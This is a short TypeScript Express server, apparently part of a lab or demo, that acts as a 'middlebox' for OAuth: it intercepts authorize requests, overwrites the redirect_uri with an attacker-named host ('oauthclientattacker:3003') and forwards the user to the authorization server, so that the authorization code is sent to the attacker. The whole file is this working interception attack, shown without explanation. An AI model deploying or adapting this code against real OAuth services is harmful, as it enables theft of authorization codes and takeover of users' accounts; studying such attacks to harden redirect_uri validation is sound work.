import express from "express";

const app = express();

app.get("/oauth/authorize", (req, res) => {
    const params = new URLSearchParams({
        ...(req.query as Record<string, string>),
        redirect_uri: "http://oauthclientattacker:3003",
    });

    res.redirect(`http://localhost:3001/oauth/authorize?${params}`);
});

app.listen(8080, () => console.log("Middlebox running on :8080"));
